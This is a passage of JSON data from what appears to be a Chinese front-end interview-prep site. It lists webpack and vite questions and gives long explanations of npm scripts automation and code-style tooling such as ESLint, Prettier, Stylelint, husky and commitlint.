        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-09T01:29:53.000Z"
      },
      {
        "exerciseKey": "402c1f77-c556-4a1b-984f-07004305fba2",
        "title": "webpack treeShaking机制的原理是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-05T07:58:26.000Z",
        "updateAt": "2024-08-10T17:05:45.000Z"
      },
      {
        "exerciseKey": "45f3d2fd-ebbc-43d6-8dff-4e5ebcc79afc",
        "title": "说说 webpack 异步加载的原理",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T18:33:13.000Z"
      },
      {
        "exerciseKey": "499b7dea-d215-42a1-9c08-44fa8f65e1ee",
        "title": "vite 和  webpack 在热更新的实现上有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-30T01:35:01.000Z"
      },
      {
        "exerciseKey": "72ab3559-3038-4a2c-985d-dd9004101ecf",
        "title": "webpack 分包的方式有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T18:36:07.000Z"
      },
      {
        "exerciseKey": "745130e9-61d4-4e51-8a8f-f1c8be354970",
        "title": "esbuild 和 rollup 都是 vite 的基础依赖，它们有什么不同呢？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-30T01:33:07.000Z"
      },
      {
        "exerciseKey": "892f8cb0-4fab-4d43-8586-90b83e9da3aa",
        "title": "什么情况下会导致 webpack treeShaking 失效？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T09:12:41.000Z"
      },
      {
        "exerciseKey": "9dc34a20-34be-4c0f-a401-71d936cf4958",
        "title": "webpack、rollup、parcel优劣",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:53:32.000Z",
        "updateAt": "2021-07-07T00:10:46.000Z"
      },
      {
        "exerciseKey": "acf22a0a-87de-4627-a564-cdcd04a504bb",
        "title": "webpack 中的 externals 作用是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T18:34:35.000Z"
      },
      {
        "exerciseKey": "b4fc51b1-88d0-4213-80a0-49a5d9c6b9f4",
        "title": "说一下 vite 的构建流程",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:51:38.000Z",
        "updateAt": "2024-08-10T17:07:36.000Z"
      },
      {
        "exerciseKey": "c1ee1a9b-5955-4dc1-a89d-2ce7b017616a",
        "title": "Vue 3.0中Treeshaking特性是什么，并举例进行说明？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:55:04.000Z",
        "updateAt": "2024-08-10T17:04:52.000Z"
      },
      {
        "exerciseKey": "cc4f1e33-57aa-487b-9bac-6b16ac8457aa",
        "title": "webpack 是如何给 web 应用注入环境变量的，说说它的原理",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T09:23:02.000Z"
      },
      {
        "exerciseKey": "d9ebcb10-02a4-448c-9a27-b5bcfacce4fa",
        "title": "为什么 webpack 可以通过文件打包，让浏览器可以支持 CommonJS 规范？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-09-03T01:40:50.000Z"
      },
      {
        "exerciseKey": "dc78e2f9-568a-445d-988c-594092179848",
        "title": "聊聊 vite 和 webpack 的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-04-27T11:27:02.000Z",
        "updateAt": "2024-08-10T17:07:15.000Z"
      },
      {
        "exerciseKey": "f6b9383c-1ba2-47cc-a8db-5f9c4bbf77eb",
        "title": "vite 使用了哪些编译器，分别有什么作用？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-30T01:30:54.000Z"
      }
    ]
  },
  "262": {
    "id": 262,
    "tagId": 28,
    "title": "前端任务自动化（npm scripts实现）",
    "explanation": "在前端开发中，我们经常需要执行各种重复性任务，比如编译代码、启动本地服务器、监听文件变化、运行测试、部署代码等。虽然可以使用不同的工具来完成这些任务，但`npm`本身提供了一个强大的功能：`npm scripts`。通过`npm scripts`，我们可以将这些任务脚本化并集中管理，从而提高开发效率。\n\n本文将专注于如何使用`npm scripts`自动化前端开发任务，以及它在项目管理中的作用。\n\n### 什么是`npm scripts`？\n\n`npm scripts`是`npm`提供的一种机制，允许我们在项目的`package.json`文件中定义一组命令，方便执行各种任务。在`package.json`文件中，`scripts`字段可以包含多个脚本，每个脚本都是一个键值对，其中键是脚本的名称，值是实际要执行的命令。例如：\n\n```\n{\n  \"scripts\": {\n    \"build\": \"webpack --config webpack.config.js\",\n    \"test\": \"jest\"\n  }\n}\n```\n\n在上面的示例中，定义了两个脚本：`build` 和 `test`。可以通过以下方式在命令行中运行这些脚本：\n\n```\nnpm run build\nnpm run test\n```\n\n`npm`会执行对应的命令，自动帮我们完成编译和测试任务。\n\n### 为什么使用`npm scripts`？\n\n在现代前端开发流程中，自动化任务是不可或缺的，而`npm scripts`的使用有以下几大优势：\n\n1. **减少对全局依赖的需求**：在传统项目中，开发者通常需要全局安装各种命令行工具，如`webpack`、`eslint`、`babel`等。而`npm scripts`可以直接调用项目的本地依赖，无需全局安装。这确保了不同开发环境中的工具版本一致，减少了版本冲突和兼容性问题。\n2. **集中管理任务**：`npm scripts`将所有任务定义集中在`package.json`文件中，项目中的所有开发人员都可以直观地看到可用的任务列表，无需了解每个工具的详细使用方法。只需运行`npm run <task>`，便可一键完成常见任务。\n3. **支持跨平台执行**：`npm scripts`中的命令可以跨平台使用，在Windows、macOS和Linux系统上表现一致，尤其适合团队协作。\n4. **便于组合和链式执行**：`npm`允许通过逻辑操作符来组合脚本，实现复杂任务的自动化执行。例如可以通过`&&`和`||`来串联多个任务，使得多个步骤一次完成。\n\n### 如何定义和使用`npm scripts`？\n\n让我们通过具体的示例来看看`npm scripts`如何自动化前端开发任务。\n\n#### 1. 设置基本的开发任务\n\n假设我们正在开发一个React项目，我们可以在`package.json`中定义以下基本任务：\n\n```\n{\n  \"scripts\": {\n    \"start\": \"webpack serve --mode development\",\n    \"build\": \"webpack --mode production\",\n    \"test\": \"jest\",\n    \"lint\": \"eslint src/**/*.js\"\n  }\n}\n```\n\n这里的脚本分别执行以下任务：\n\n* `npm run start`：使用Webpack启动开发服务器，运行在开发模式下。\n* `npm run build`：构建项目并打包为生产环境代码。\n* `npm run test`：使用`jest`运行单元测试。\n* `npm run lint`：使用`eslint`检查`src`目录下的JavaScript代码格式。\n\n通过定义这些脚本，我们可以一键运行开发服务器、构建项目、测试代码和检查代码风格，而不必在每次执行命令时记住各个工具的具体参数。\n\n#### 2. 监听文件变化自动化任务\n\n在前端开发中，我们通常希望在代码更改后自动执行某些任务。例如，自动运行测试或代码格式检查。我们可以利用`--watch`参数来实现这一目的：\n\n```\n{\n  \"scripts\": {\n    \"test:watch\": \"jest --watch\",\n    \"lint:watch\": \"chokidar 'src/**/*.js' -c 'npm run lint'\"\n  }\n}\n```\n\n这里：\n\n* `test:watch`使用Jest的`--watch`模式，当代码发生变动时自动重新运行测试。\n* `lint:watch`使用`chokidar`工具监视`src`目录中的JavaScript文件。如果文件有变化，就会自动执行`lint`任务。\n\n这样，我们在开发过程中只需启动这些监听脚本，当文件发生变化时，测试和代码检查会自动执行，大大提高了开发效率。\n\n#### 3. 链式执行任务\n\n在实际开发中，有时需要将多个任务按顺序执行。例如，在构建项目时，先清理旧的构建文件夹，然后执行代码检查，最后进行打包。我们可以用`&&`来串联这些命令：\n\n```\n{\n  \"scripts\": {\n    \"clean\": \"rimraf dist\",\n    \"prebuild\": \"npm run clean && npm run lint\",\n    \"build\": \"npm run prebuild && webpack --mode production\"\n  }\n}\n```\n\n在这个示例中：\n\n* `clean`任务使用`rimraf`工具删除`dist`目录中的旧文件。\n* `prebuild`任务先执行`clean`，然后运行`lint`。\n* `build`任务会先运行`prebuild`，再进行项目的生产环境打包。\n\n通过将任务串联起来，我们确保项目在打包前先清理旧文件并检查代码格式，减少了出错的可能性。\n\n#### 4. 使用`pre`和`post`钩子自动执行相关任务\n\n`npm scripts`支持`pre`和`post`钩子，可以在任务的前后自动执行相关任务。例如，我们可以定义`prebuild`和`postbuild`脚本，在`build`任务之前和之后分别执行。\n\n```\n{\n  \"scripts\": {\n    \"prebuild\": \"echo 'Preparing to build...'\",\n    \"build\": \"webpack --mode production\",\n    \"postbuild\": \"echo 'Build completed!'\"\n  }\n}\n```\n\n在运行`npm run build`时：\n\n* `npm`会先执行`prebuild`，输出`Preparing to build...`。\n* 然后执行`build`脚本，运行Webpack进行打包。\n* 最后执行`postbuild`，输出`Build completed!`。\n\n这样，我们可以在任务执行前后插入自定义逻辑，帮助我们更好地管理任务执行流程。例如，可以在`pretest`钩子中准备测试环境，或者在`posttest`钩子中清理临时文件。\n\n### 进阶：使用环境变量控制行为\n\n在一些场景下，我们可能需要根据环境变量来调整脚本的行为。例如，根据不同的环境（开发、测试、生产）来加载不同的配置。在`npm scripts`中，可以通过`process.env`访问环境变量。\n\n假设我们希望在构建时区分环境，可以这样设置：\n\n```\n{\n  \"scripts\": {\n    \"build:dev\": \"NODE_ENV=development webpack --mode development\",\n    \"build:prod\": \"NODE_ENV=production webpack --mode production\"\n  }\n}\n```\n\n在上面的例子中：\n\n* `build:dev`任务会将`NODE_ENV`设置为`development`，然后运行Webpack的开发模式。\n* `build:prod`任务会将`NODE_ENV`设置为`production`，然后运行Webpack的生产模式。\n\n在JavaScript代码中可以通过`process.env.NODE_ENV`访问这些环境变量，从而加载不同的配置文件或启用不同的功能。这样可以灵活地控制构建行为，满足不同环境下的需求。\n\n### 常用工具组合\n\n为了提升`npm scripts`的功能，前端开发中常会借助一些第三方工具。以下是一些常用工具，可以和`npm scripts`一起使用：\n\n* **rimraf**：用于跨平台删除文件或文件夹，类似`rm -rf`。适合清理构建目录。\n* **chokidar-cli**：用于文件监听，支持监控文件变化并触发相应任务。\n* **concurrently**：允许并行运行多个脚本。例如，可以同时启动前端和后端服务。\n* **cross-env**：用于跨平台设置环境变量。适合在Windows和Linux系统上统一环境变量设置。\n\n### 总结\n\n`npm scripts` 是一个强大的工具，能够帮助前端开发者自动化日常开发任务，包括启动服务器、编译代码、运行测试、监听文件变化等。通过合理配置`npm scripts`，可以减少对外部任务管理工具的依赖，将所有任务集中在`package.json`中进行管理，使项目更加统一和可维护。",
    "testPoint": "**前端任务自动化（npm scripts 实现）** 是工程化体系中基础而高频的考察点，尤其在构建、部署、测试、格式化、Lint 等流程中都有体现。\n\n面试时，这一部分的重点在于「理解 npm scripts 的执行原理、任务编排能力、以及与其他工具的协作方式」。\n\n\n\n## 一、基础认知类\n\n| 考点              | 说明                                              |\n| --------------- | ----------------------------------------------- |\n| 什么是 npm scripts | package.json 中的 `scripts` 字段，用于定义项目自动化任务        |\n| 执行方式            | 通过 `npm run xxx` 或 `pnpm/yarn run xxx` 触发执行     |\n| 执行原理            | 实际上是调用系统命令，自动添加 `node_modules/.bin` 到 PATH 环境变量 |\n| 默认脚本            | `npm start`、`npm test`、`npm run build` 等有默认别名   |\n\n---\n\n## 二、任务执行与编排\n\n| 考点     | 说明                                             |\n| ------ | ---------------------------------------------- |\n| 串行执行   | 使用 `&&` 连接多个命令，前一条成功后执行下一条                     |\n| 并行执行   | 使用 `&`（Unix）或借助工具 `npm-run-all`、`concurrently` |\n| 跨平台兼容性 | Windows 与 macOS 的命令差异问题（如环境变量写法）               |\n| 环境变量设置 | `cross-env` 的作用与使用场景                           |\n| 任务拆分   | 拆分多个脚本以便组合执行（例如 build:js、build:css、build:all）  |\n| 脚本参数传递 | 使用 `npm run build -- --watch` 方式向脚本传参          |\n\n---\n\n## 三、常见任务类型（重点考察实际使用）\n\n| 类型         | 示例任务                | 说明                               |\n| ---------- | ------------------- | -------------------------------- |\n| 启动开发服务器    | `npm run dev`       | 通常调用 `vite`、`webpack-dev-server` |\n| 构建生产环境     | `npm run build`     | 打包、压缩、生成静态资源                     |\n| 代码检查       | `npm run lint`      | 运行 ESLint、Stylelint 等            |\n| 格式化代码      | `npm run format`    | 调用 Prettier 执行代码统一格式             |\n| 测试任务       | `npm run test`      | 执行 Jest、Vitest、Mocha 等测试框架       |\n| 预提交检查      | `npm run precommit` | 搭配 lint-staged、husky 实现自动校验      |\n| 清理构建目录     | `npm run clean`     | 删除 dist/build 目录，常配合 rimraf      |\n| 自动部署       | `npm run deploy`    | 上传构建产物到服务器或 OSS/CDN              |\n| 本地 mock 启动 | `npm run mock`      | 启动本地 mock server                 |\n\n---\n\n## 四、工具协作方向（进阶考察）\n\n| 工具                      | 说明                                        |\n| ----------------------- | ----------------------------------------- |\n| `cross-env`             | 解决不同操作系统下环境变量写法差异，如 `NODE_ENV=production` |\n| `rimraf`                | 跨平台删除文件（Windows 不支持 `rm -rf`）             |\n| `npm-run-all`           | 实现串行/并行任务组合：`npm-run-all clean build:*`   |\n| `concurrently`          | 同时运行多个命令，如启动前端与后端服务                       |\n| `husky` + `lint-staged` | 实现 Git 钩子（pre-commit、pre-push）任务自动化       |\n| `npx`                   | 临时执行命令，无需全局安装包                            |\n\n---\n\n## 五、环境与配置考察点\n\n| 考点               | 说明                                                 |\n| ---------------- | -------------------------------------------------- |\n| 环境变量注入           | 如何通过 npm script 传入不同环境配置（dev/test/prod）            |\n| 通过 `.env` 文件管理配置 | 与构建工具结合（Vite、CRA 支持自动加载）                           |\n| 不同环境打包脚本         | `npm run build:staging`、`npm run build:prod` 的配置差异 |\n| CI 环境脚本          | 在 GitLab CI、GitHub Actions 中执行 npm scripts 的方式     |\n\n---\n\n## 六、性能与可维护性优化方向\n\n| 优化点                  | 说明                                       |   |                   |\n| -------------------- | ---------------------------------------- | - | ----------------- |\n| 拆分任务                 | 避免单个脚本过长、难以维护                            |   |                   |\n| 使用 npm-run-all 管理脚本流 | 提升脚本组合可读性                                |   |                   |\n| 脚本文档化                | 在 README 或 package.json 中描述每个 script 的用途 |   |                   |\n| 避免重复安装               | 利用 npx 调用工具，减少全局安装依赖                     |   |                   |\n| 错误处理                 | 使用 `set -e`、`                            |   | exit 1` 等确保错误中断流程 |\n\n---\n\n## 七、常见面试问题示例\n\n1. **npm scripts 和 Gulp、Webpack 有什么区别？**\n\n   * npm scripts 更底层，本质是命令行任务调度器，而 Gulp/Webpack 是构建工具。\n\n2. **如何在 npm scripts 中设置不同环境变量？**\n\n   * 使用 `cross-env NODE_ENV=production webpack --config webpack.prod.js`。\n\n3. **如何同时运行多个命令？**\n\n   * 可用 `concurrently` 或 `npm-run-all --parallel`。\n\n4. **`pre` 与 `post` 钩子机制的作用是什么？**\n\n   * npm 支持如 `prebuild`、`postbuild` 自动在主任务前后执行脚本。\n\n5. **如何在 CI/CD 中自动执行构建与部署？**\n\n   * 将 npm scripts 集成到 CI 流水线中，通过 `npm ci && npm run build && npm run deploy` 实现自动化。\n\n---\n\n## 八、拓展方向（高级工程化）\n\n| 考点                   | 说明                                    |\n| -------------------- | ------------------------------------- |\n| 使用 turbo / nx 优化任务调度 | 在 Monorepo 中实现任务缓存和并行优化               |\n| 与 Docker 结合          | npm scripts 调用 docker-compose 管理容器化流程 |\n| 跨项目脚本共享              | 通过私有 npm 包统一封装通用任务（如 lint、build）      |\n| 自定义 CLI              | 将 npm scripts 封装为内部命令工具（如 `@org/cli`） |\n",
    "exerciseKeyList": "[\"0568e8ee-d540-4b5a-bb66-7ed7add20e41\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T02:32:12.000Z",
    "updateAt": "2025-10-23T08:25:57.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0568e8ee-d540-4b5a-bb66-7ed7add20e41",
        "title": "npm script 了解多少？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:58:39.000Z"
      }
    ]
  },
  "263": {
    "id": 263,
    "tagId": 28,
    "title": "代码规范工程化",
    "explanation": "规范化是前端工程化的一个重要部分。现在，有许多工具能够辅助我们实行代码的规范化,比如你一定知道的 ESLint 和 Prettier。\n\n今天，来聊聊这些工具的工作原理和基本使用，了解它们是如何发挥作用的，以及如何更好地利用这些工具去规范项目的代码。\n\n## 1. ESlint - 检查你的 JavaScript 代码\n\n让我们先从知名度最高的 ESLint 开始。\n\n### 1.1. ESLint 及其作用\n\nLint 是一类专门用于检查代码的工具软件， 也称 linter。ESLint ，即 JavaScript （ECMAScript）代码的检查工具。\n\n正如官网的介绍 —— “Find and fix problems in your JavaScript code”，ESLint 能够辅助查找出你的 JavaScript 代码中的问题，包括：\n\n* 代码风格问题（styles）。比如，运算符两边的空格、语句末尾的分号。\n* 不好的写法。比如，使用 `==` 进行比较而不是 `===`。\n* 可能存在逻辑问题的代码模式。比如，定义了一个变量，但没有使用到它。\n\n此外，ESLint 还能够帮你自动修复一些简单的问题。\n\n我们将在下一小结学习如何使用 ESLint 检查我们的 JavaScript 代码，并修复其中的一些问题。\n\n### 1.2. ESLint 快速上手\n\n为了在项目中使用 ESLint，需要先安装它。\n\n```\n# 初始化一个 npm 项目\nmkdir eslint-test\ncd eslint-test\nnpm init -y\n# 安装 eslint\nnpm init @eslint/config\n\n```\n\n回答一系列问题后，你可以看目录中的配置文件 `.eslintrc.js`，这个配置文件告诉 ESLint 如何去解析项目，这个项目采用了哪些规范和规则。\n\nESLint 是一个高度配置化的工具。尤其需要留意 `extends` 和 `rules` 字段，它们定义了在项目中采用哪些规则。一段代码有没有问题，取决于项目中应用了哪些规则。比如：`{semi: [\"error\", \"always\"]}` 要求必须在语句末尾添加分号，相反，`semi: [\"error\", \"never\"]` 禁止任何不必要的分号。\n\n具体的配置教程可以参考[官方配置文档](https://link.juejin.cn?target=https%3A%2F%2Feslint.org%2Fdocs%2Flatest%2Fuser-guide%2Fconfiguring%2F \"https://eslint.org/docs/latest/user-guide/configuring/\")，不是这里三两句能说完的。\n\n在这里，我使用的是 [airbnb-base](https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Feslint-config-airbnb-base \"https://www.npmjs.com/package/eslint-config-airbnb-base\") 规范。\n\n```\nmodule.exports{\n  // ...\n  extends: 'airbnb-base'\n  // ...\n}\n\n```\n\n写一段简单的 JavaScript 代码用于测试：\n\n```\n// file - add.js\nfunction add(x,y) {\n  return Number(x)+Number(y);\n}\n\n// ❌ 这是一个错误的调用\nadd(\"2\"+'3')\n\n```\n\nESLint 是一个命令行工具，这个命令调用之前安装的 ESLint 去检查 `add.js` 代码：\n\n```\nnpx eslint add.js\n\n```\n\n输出结果：\n\n```\neslint-test/add.js\n  1:15  error  A space is required after ','                comma-spacing\n  2:19  error  Operator '+' must be spaced                  space-infix-ops\n  5:5   error  Strings must use singlequote                 quotes\n  5:8   error  Operator '+' must be spaced                  space-infix-ops\n  5:8   error  Unexpected string concatenation of literals  no-useless-concat\n\n✖ 5 problems (5 errors, 0 warnings)\n  4 errors and 0 warnings potentially fixable with the `--fix` option.\n\n```\n\n可以看到，ESLint 发现了代码中的 5 个 error 等级的问题，并且提示其中的 4 个问题是**可修复**的。根据提示，执行：\n\n```\nnpx eslint add.js --fix\n\n```\n\n可以看到，现在提示只有一个问题：\n\n```\neslint-test/add.js\n  5:9  error  Unexpected string concatenation of literals  no-useless-concat\n\n✖ 1 problem (1 error, 0 warnings)\n\n```\n\n重新查看 `add.js` 文件，可以看到 4 个格式化问题已经被自动修复了。检查第 5 行 `add('2' + '3');`, 发现正确写法应该是 `add('2', '3');`。\n\n很好，所有的问题都解决了，ESLint 可帮了大忙 👍 。\n\n尽管在实际中，我们很少直接调用 `eslint` 命令，更多是配合编辑器和一些工作流工具使用（后面小结内容）。不过，记住 ESLint 原本是一个命令行工具，对我们理解它的工作原理很有帮助。\n\n### 1.3. 配合编辑器使用的 ESLint\n\n上一节中，我们是在命令行下使用 ESLint，并从命令行的输出中看到代码中的问题。\n\n![image.png](https://static.ecool.fun//article/fb34a266-314f-4eb9-a9a4-bd4c759de018.awebp)\n\n许多人是从编辑器里接触 ESLint 的。的确，当 ESLint 与编辑器配合工作时，它的威力才真正显现出来。\n\n以 VSCode 为例，在 VSCode 上使用 ESLint 需要安装 [ESLint 插件](https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Ddbaeumer.vscode-eslint \"https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint\")。启用插件后，可以在编辑代码的同时看到哪些代码有问题，及时发现，及时修复。使用鼠标 hover 红线，或者在下方的 PROBLEMS 面板中都可以看到具体的错误提示。\n\n![image.png](https://static.ecool.fun//article/0f804325-5fcb-451c-91ed-aa73e7b96854.awebp)\nAwesome！不过，问题来了：\n\n1. 插件做了什么，这种功能怎么实现的？\n2. 装了插件还需要在项目里安装 ESLint 吗？\n3. 不同的项目中使用的 ESLint 版本和配置的规则不同，会发生冲突吗？\n\n**回答：**\n\n1. 插件原理：插件我们敲码的时候，在后台自动执行 `eslint` 命令分析代码，并根据结果实时回显到编辑器中。\n2. 需要每个项目内安装 ESLint。看插件的文档：\n\n> The extension uses the ESLint library installed in the opened workspace folder. If the folder doesn't provide one the extension looks for a global install version.\n>\n> 插件使用当前项目目录中安装的 ESLint 库。如果目录中没有安装，则尝试使用全局安装的。\n\n说明，插件并不包含 ESLint 核心库，而是尝试读取本地或全局安装的 ESLint，并使用查找读取项目内的 `eslintrc.*` 配置文件。\n\n> 💡 如果插件无法正确读取项目中的 ESLint 程序和配置，会导致插件启动失败。这个问题常常是因为 ESLint 没有安装在打开目录的根部。可以通过修改[插件的配置](https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Ddbaeumer.vscode-eslint%23settings-options \"https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint#settings-options\")解决。\n\n3. 因为插件始终使用工作目录中的 ESLint 程序和配置，当使用本地安装时，每个项目都是独立的，不会冲突。\n\n### 1.4. 启用编辑器的保存自动修复功能\n\n编辑器还有一个强大的功能，可以在保存时，自动修复那些支持自动修复的问题，不用执行额外的 `eslint --fix files` 命令， **强烈推荐开启**。\n\n在 VSCode，你可能需要添加设置来启用自动修复功能：\n\n```\n{\n  // ...\n  \"editor.codeActionsOnSave\": {\n    \"source.fixAll.eslint\": true\n  }\n}\n\n```\n\nWebStorm 用户可以参考[这里](https://link.juejin.cn?target=https%3A%2F%2Fwww.jetbrains.com%2Fhelp%2Fwebstorm%2Feslint.html%23ws_eslint_configure_run_eslint_on_save \"https://www.jetbrains.com/help/webstorm/eslint.html#ws_eslint_configure_run_eslint_on_save\")设置。\n\n启用后，就几乎不用手动执行 `eslint` 命令了。\n\n## 2. Prettier\n\n另一个广为人知的工具是 [Prettier](https://link.juejin.cn?target=https%3A%2F%2Fprettier.io%2F \"https://prettier.io/\")，它是一个代码格式化工具。\n\n### 2.1. 使用 Prettier\n\n当你了解了 ESLint 的使用后，自然你也能理解 Prettier 的使用。\n\nPrettier 同样支持配置，不过相对简单，同样可以通过命令行执行，同样可以有编辑器插件可以和编辑器配合，具体可以参考官方文档。\n\n### 2.2. Prettier vs ESLint\n\n你可能好奇 Prettier 和 ESLint 有什么区别？\n\n首先，虽然它们都会对代码 AST（语法树）进行检查，但 Prettier 只会进行语法分析，只能检查并归正代码的**格式问题**，而 ESLint 还会进一步对代码进行语义分析，能发现**格式问题和代码模式问题**。比如，用 let 声明了一个变量，但是这个变量在后面并没有被重新赋值，因为没有格式问题，Prettier 会通过，而 ESLint 则能发现这里应该使用 const 声明更好。\n\n既然 ESLint 也能做格式化工具，那为什么还需要 Prettier？因为 ESLint 只能检查 JavaScript 代码以及 TypeScript、JSX 等衍生代码（需配置解析器），无法检查项目中的 CSS、HTML 等代码。Prettier 则天然支持对大多数项目文件的格式化，包括 JSX、Vue、TypeScript、CSS、HTML、JSON、Markdown、YAML 等。\n\n### 2.3. 同时使用 Prettier 和 ESLint\n\n从上面可以看出，在 JavaScript 及其衍生语言的格式化上，ESLint 和 Prettier 是有重合的。所以，在实际运用中，我们需要保证这些文件只会采用其中一种进行格式化，避免不必要的格式化。更遭的情况是启用了两个，而且两个工具的风格配置互相冲突。我就曾在项目中遇到这种情况，ESLint 格式化之后，Prettier 也执行格式化，结果 ESLint 检查还是不通过。\n\n我推荐在 JavaScript 中也使用 Prettier。因为 ESLint 需要我们把风格配置成 error 等级，才会支持自动修复。但是，这样，一旦有格式问题，编辑器就会标红，很烦人，强迫症受不了，而 Prettier 不会有。下图是一段只有风格问题的代码在分别启用这两种工具时的编辑器显示。\n\n![image.png](https://static.ecool.fun//article/416a8e6a-cc07-4ce8-8f47-82f48414a601.awebp)\n\n要同时使用二者，就需要关闭 ESLint 中可能和 Prettier 冲突的规则，而这就是 [eslint-config-prettier](https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fprettier%2Feslint-config-prettier \"https://github.com/prettier/eslint-config-prettier\") 所做的事。所以，想同时使用两者，你需要在 ESLint 中使用该配置，具体的配置方式参考使用文档即可。\n\n如果你只想在 JavaScript 中使用 ESLint，可以在 `.prettierignore` 中忽略所以的 JavaScript 文件即可。\n\n## 3. Stylelint\n\n顾名思义，[Stylelint](https://link.juejin.cn?target=https%3A%2F%2Fstylelint.io%2F \"https://stylelint.io/\") 就是样式代码的 linter。\n\n> A mighty CSS linter that helps you avoid errors and enforce conventions.\n\n它的功能和使用，都和 ESLint 类似，不过作用目标不同而已。\n\n和 Prettier 的区别在于，它和 ESLint 一样，是一个 linter，会进行语义分析，能发现一些模式问题。在 Stylelint 15 之前，如果同时使用 Stylelint 和 Prettier，也需要使用 [stylelint-config-prettier](https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fprettier%2Fstylelint-config-prettier \"https://github.com/prettier/stylelint-config-prettier\")\n避免在样式文件上的规则冲突。Stylelint 15 废弃了所有风格规则，不会和 Prettier 冲突。\n\n## 4. 工作流工具\n\n将 linter/formatter 与一些工作流工具配合，能够实现团队规范的自动化。\n\n规范化原则是：**越早发现不规范的代码，改正的成本越低。**\n\n### 4.1. 编码时：编辑器支持\n\n从编码开始，就推荐你启用编辑器的代码检查功能，这可能是需要插件或者设置来实现。同时，建议开启保存时自动格式化，这能持续保证你的代码是符合规范的。\n\n### 4.2. 提交时：Git hooks + lint-staged\n\nGit pre-commit hook 可以让我们在提交之前执行一些命令，利用这点，可以在提交前对代码执行代码的 lint 检查和格式化，自动修复一些可以修复的问题，如果有不可自动修复的问题，取消本次提交，从而，避免不规范的代码被提交到代码仓库。\n\n默认的 Git hook 不容易设置，社区中流行使用 [husky](https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftypicode%2Fhusky \"https://github.com/typicode/husky\") 进行配置。\n\n每次提交时的检查应该是针对当前 commit 内修改的内容，而不是全部文件，也就是只检查暂存区内的文件。[🚫💩lint-staged](https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Flint-staged \"https://www.npmjs.com/package/lint-staged\")可以实现这种效果。\n\n具体的配置方式请参阅这两个工具的文档。\n\n### 4.3. 交付时：CI 集成\n\npre-commit 检查可以通过 `git commit --no-verify` 跳过，导致一些不规范的代码被 push 到代码仓库。\n\n可以通过 Gitlab-CI 或 Github Action 这类 CI 工具集成代码检查，在代码被 push 到远程仓库，或者 merge request 发起时，执行特定的任务对代码发起检查。\n\n值得一提的是，CI 集成可以是整个代码仓库统一的，这样，可以实现公司层面的所有项目统一标准，而不只是基于团队和项目。\n\n## 5. 其它工具\n\n### 5.1. commitlint：规范提交消息\n\n[commitlint - Lint commit messages](https://link.juejin.cn?target=https%3A%2F%2Fcommitlint.js.org%2F%23%2F \"https://commitlint.js.org/#/\") 是规范提交消息（commit message）的一个工具，可以避免有些小伙伴就喜欢 `git commit -m \"u\"`，要求一个提交消息符合[Conventional Commits](https://link.juejin.cn?target=https%3A%2F%2Fwww.conventionalcommits.org%2Fen%2Fv1.0.0%2F \"https://www.conventionalcommits.org/en/v1.0.0/\")规范，即以下形式：\n\n```\n<type>[optional scope]: <description>\n\n[optional body]\n\n[optional footer(s)]\n\n```\n\ncommitlint 本身是一个命令行工具，用于判断一个消息是否符合规范。\n\n```\n# Lint from stdin\necho 'foo: bar' | commitlint\n⧗   input: foo: bar\n✖   type must be one of [build, chore, ci, docs, feat, fix, perf, refactor, revert, style, test] [type-enum]\n\n✖   found 1 problems, 0 warnings\nⓘ   Get help: https://github.com/conventional-changelog/commitlint/#what-is-commitlint\n\n```\n\n为了实现在 commit 时检查消息，需要和 git commit-msg hook 配合。配合上面提到的 husky：\n\n```\nnpx husky add .husky/commit-msg  'npx --no -- commitlint --edit ${1}'\n\n```\n\n### 5.2. branch-name-lint: 规范分支名\n\n如果希望规范团队项目中的分支名称，可以使用[branch-name-lint](https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fbranch-name-lint \"https://www.npmjs.com/package/branch-name-lint\")。\n\n一般地，项目只需要规范成员 push 到远程仓库的分支名称符合规范即可，不限制本地分支。按这个思路，可以利用 git pre-push hook：\n\n```\nnpx husky add .husky/pre-push  'npx --no -- branch-name-lint <your-configuration.json>'\n\n```\n\n### 5.3. EditorConfig: 